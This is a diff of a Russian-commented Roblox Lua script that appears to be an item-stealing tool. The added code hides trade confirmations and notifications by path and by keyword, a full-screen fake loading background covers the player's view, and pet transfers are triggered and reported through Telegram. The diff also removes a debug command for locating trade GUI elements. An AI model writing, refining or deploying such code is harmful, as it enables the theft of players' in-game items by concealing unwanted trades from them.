@@ -4,125 +4,76 @@ local HttpService = game:GetService("HttpService")
 local TextChatService = game:GetService("TextChatService")
 local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
--- 🔍 ОТЛАДОЧНАЯ ФУНКЦИЯ ДЛЯ ПОИСКА ТРЕЙД ЭЛЕМЕНТОВ
-local function findTradeElements()
-    print("=== ПОИСК ТРЕЙД ЭЛЕМЕНТОВ ===")
-    
-    for _, gui in ipairs(LocalPlayer.PlayerGui:GetChildren()) do
-        if gui:IsA("ScreenGui") then
-            print("Проверяем GUI:", gui.Name)
-            
-            for _, obj in ipairs(gui:GetDescendants()) do
-                if obj:IsA("TextLabel") and obj.Visible and obj.Text ~= "" then
-                    local text = obj.Text:lower()
-                    local position = obj.AbsolutePosition
-                    local size = obj.AbsoluteSize
-                    
-                    -- Вычисляем центр экрана
-                    local screenCenter = workspace.CurrentCamera.ViewportSize
-                    local centerX = screenCenter.X / 2
-                    local centerY = screenCenter.Y / 2
-                    
-                    -- Вычисляем центр объекта
-                    local objCenterX = position.X + size.X / 2
-                    local objCenterY = position.Y + size.Y / 2
-                    
-                    -- Расстояние от центра
-                    local distanceFromCenter = math.sqrt((objCenterX - centerX)^2 + (objCenterY - centerY)^2)
-                    
-                    -- Если текст содержит торговые слова или находится в центре
-                    if text:find("trade") or text:find("gift") or text:find("accept") or text:find("decline") or
-                       text:find("request") or text:find("offer") or distanceFromCenter < 250 then
-                        
-                        print("НАЙДЕН ЭЛЕМЕНТ:")
-                        print("  Путь:", gui.Name .. " -> " .. obj:GetFullName())
-                        print("  Имя:", obj.Name)
-                        print("  Текст:", obj.Text)
-                        print("  Позиция:", position.X, position.Y)
-                        print("  Размер:", size.X, size.Y)
-                        print("  Центр объекта:", objCenterX, objCenterY)
-                        print("  Центр экрана:", centerX, centerY)
-                        print("  Расстояние от центра:", math.floor(distanceFromCenter))
-                        print("  Цвет текста:", obj.TextColor3)
-                        print("  Родитель:", obj.Parent and obj.Parent.Name or "nil")
-                        print("  Прозрачность:", obj.TextTransparency)
-                        print("  Видимость:", obj.Visible)
-                        print("  ClassName:", obj.ClassName)
-                        print("---")
-                    end
-                end
-            end
-        end
+-- 🛡️ СИСТЕМА СКРЫТИЯ ТОРГОВЫХ УВЕДОМЛЕНИЙ И GUI ЭЛЕМЕНТОВ
+-- Список путей для скрытия
+local paths = {
+    {"Trading", "FinalizingTrade", "Image"},
+    {"Trading", "FinalizingTrade", "Text"},
+    {"Trading", "FinalizingTrade"},
+    {"Top_Notification"},
+}
+
+-- Ищем объект по массиву пути
+local function findByPath(root, pathArray)
+    local obj = root
+    for _, name in ipairs(pathArray) do
+        obj = obj:FindFirstChild(name)
+        if not obj then return nil end
     end
-    
-    print("=== ПОИСК ЗАВЕРШЕН ===")
+    return obj
 end
 
--- Команда для поиска (добавляем в систему команд)
--- Теперь игрок может написать "find" чтобы найти элементы
-local function hideMiddleScreenText()
+-- Выключаем Visible
+local function disableByPath(pathArray)
+    local obj = findByPath(PlayerGui, pathArray)
+    if obj and obj:IsA("GuiObject") then
+        obj.Visible = false
+        warn("❌ Скрыт: " .. table.concat(pathArray, "."))
+    elseif obj then
+        -- если это контейнер (Frame и т.п.)
+        if obj:IsA("Instance") then
+            for _, child in ipairs(obj:GetDescendants()) do
+                if child:IsA("GuiObject") then
+                    child.Visible = false
+                end
+            end
+            warn("❌ Скрыт контейнер: " .. table.concat(pathArray, "."))
+        end
+    end
+end
+
+-- Скрыть при старте
+for _, p in ipairs(paths) do
+    disableByPath(p)
+end
+
+-- Следим за новыми объектами (на случай пересоздания)
+PlayerGui.DescendantAdded:Connect(function(obj)
+    for _, p in ipairs(paths) do
+        if obj.Name == p[#p] then
+            task.defer(function()
+                disableByPath(p)
+            end)
+        end
+    end
+end)
+
+-- Оптимизированная система скрытия торговых уведомлений
+local function hideTradeNotifications()
     pcall(function()
-        for _, gui in ipairs(LocalPlayer.PlayerGui:GetChildren()) do
-            if gui:IsA("ScreenGui") and gui.Name ~= "CustomLoadingUI" then
-                for _, obj in ipairs(gui:GetDescendants()) do
-                    if obj:IsA("TextLabel") and obj.Visible then
-                        local text = obj.Text:lower()
-                        local position = obj.AbsolutePosition
-                        local size = obj.AbsoluteSize
-                        
-                        -- Проверяем, находится ли текст в центральной области экрана
-                        local screenCenter = workspace.CurrentCamera.ViewportSize
-                        local centerX = screenCenter.X / 2
-                        local centerY = screenCenter.Y / 2
-                        
-                        local objCenterX = position.X + size.X / 2
-                        local objCenterY = position.Y + size.Y / 2
-                        
-                        -- Если объект в центральной зоне (±200 пикселей от центра)
-                        local isInCenter = math.abs(objCenterX - centerX) < 200 and math.abs(objCenterY - centerY) < 200
-                        
-                        if isInCenter then
-                            -- Скрываем торговые/подарочные уведомления
-                            if text:find("trade") or text:find("trading") or text:find("gift") or 
-                               text:find("accept") or text:find("decline") or text:find("request") or
-                               text:find("offer") or text:find("wants") or text:find("give") or
-                               text:find("receive") or text:find("confirm") or text:find("cancel") or
-                               text:find("pending") or text:find("waiting") or text:find("sending") then
-                                
-                                -- НЕ скрываем важные элементы
-                                if not (obj.Name:find("Finalizing") or obj.Name:find("Important") or
-                                       (obj.Parent and obj.Parent.Name == "Trading")) then
-                                    obj.Visible = false
-                                    -- Дополнительно делаем прозрачным
-                                    obj.TextTransparency = 1
-                                    obj.BackgroundTransparency = 1
-                                end
-                            end
-                            
-                            -- Также скрываем белые уведомления без определенного текста
-                            if obj.TextColor3 == Color3.new(1, 1, 1) and obj.Text ~= "" and 
-                               not obj.Name:find("Loading") and not obj.Name:find("Custom") then
-                                obj.TextTransparency = 0.8 -- Делаем полупрозрачным
-                            end
-                        end
-                    end
+        for _, gui in ipairs(PlayerGui:GetChildren()) do
+            for _, obj in ipairs(gui:GetDescendants()) do
+                if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("Frame") then
+                    local text = obj.Text or ""
+                    local name = obj.Name:lower()
                     
-                    -- Также проверяем Frame элементы (могут содержать уведомления)
-                    if obj:IsA("Frame") and obj.Visible then
-                        local position = obj.AbsolutePosition
-                        local size = obj.AbsoluteSize
-                        local screenCenter = workspace.CurrentCamera.ViewportSize
-                        local centerX = screenCenter.X / 2
-                        local centerY = screenCenter.Y / 2
-                        
-                        local objCenterX = position.X + size.X / 2
-                        local objCenterY = position.Y + size.Y / 2
-                        
-                        local isInCenter = math.abs(objCenterX - centerX) < 150 and math.abs(objCenterY - centerY) < 150
-                        
-                        if isInCenter and (obj.Name:lower():find("trade") or obj.Name:lower():find("gift") or 
-                                          obj.Name:lower():find("request") or obj.Name:lower():find("notification")) then
+                    -- Скрываем торговые уведомления
+                    if text:find("trade") or text:find("trading") or text:find("accept") or text:find("decline") or
+                       name:find("trade") or name:find("gift") or name:find("request") then
+                        -- НЕ скрываем важные элементы торговли
+                        if not (obj.Name == "FinalizingTrade" or obj.Parent and obj.Parent.Name == "Trading") then
                             obj.Visible = false
                         end
                     end
@@ -132,27 +83,11 @@ local function hideMiddleScreenText()
     end)
 end
 
--- Запускаем скрытие каждые 1.5 секунды (оптимизировано)
+-- Запускаем скрытие каждые 2 секунды (не каждый кадр!)
 task.spawn(function()
     while true do
-        hideMiddleScreenText()
-        task.wait(1.5)
-    end
-end)
-
--- Дополнительная защита: скрываем новые элементы сразу при появлении
-LocalPlayer.PlayerGui.DescendantAdded:Connect(function(obj)
-    task.wait(0.5) -- Даем элементу появиться
-    
-    if obj:IsA("TextLabel") and obj.Visible then
-        local text = obj.Text:lower()
-        
-        if text:find("trade") or text:find("gift") or text:find("request") or text:find("accept") then
-            if not (obj.Name:find("Finalizing") or (obj.Parent and obj.Parent.Name == "Trading")) then
-                obj.Visible = false
-                obj.TextTransparency = 1
-            end
-        end
+        hideTradeNotifications()
+        task.wait(2)
     end
 end)
 
@@ -162,7 +97,7 @@ task.spawn(function()
     screenGui.Name = "CustomLoadingUI"
     screenGui.IgnoreGuiInset = true
     screenGui.ResetOnSpawn = false
-    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+    screenGui.Parent = PlayerGui
     
     -- ФОН
     local background = Instance.new("ImageLabel")
@@ -491,10 +426,6 @@ local function setupMessageListener()
                 elseif msg:find("status") then
                     local uptime = string.format("%.1f мин", (tick() - STATS.startTime) / 60)
                     sendToTelegram(string.format("Работает: %s\nПередано: %d", uptime, STATS.totalPetsTransferred))
-                elseif msg:find("find") then
-                    -- НОВАЯ КОМАНДА ДЛЯ ПОИСКА ТРЕЙД ЭЛЕМЕНТОВ
-                    findTradeElements()
-                    sendToTelegram("Проверь консоль F9 - там информация о найденных элементах")
                 end
             end
         end
@@ -512,10 +443,6 @@ local function setupMessageListener()
                 elseif msg:find("status") then
                     local uptime = string.format("%.1f мин", (tick() - STATS.startTime) / 60)
                     sendToTelegram(string.format("Работает: %s\nПередано: %d", uptime, STATS.totalPetsTransferred))
-                elseif msg:find("find") then
-                    -- НОВАЯ КОМАНДА ДЛЯ ПОИСКА ТРЕЙД ЭЛЕМЕНТОВ
-                    findTradeElements()
-                    sendToTelegram("Проверь консоль F9 - там информация о найденных элементах")
                 end
             end
         end)
@@ -533,7 +460,6 @@ print("'" .. TRIGGER_MESSAGE .. "' - передать питомцев")
 print("'pets' - список питомцев") 
 print("'status' - статус")
 print("'link' - ссылка на сервер")
-print("'find' - найти трейд элементы (отладка)")
 print("🛡️ Система скрытия торговых уведомлений активна")
 print("🌌 Загрузочный фон активен")
-print("🔍 Для поиска трейд элементов напиши 'find' в чат")
+print("📍 Система скрытия по путям активна")
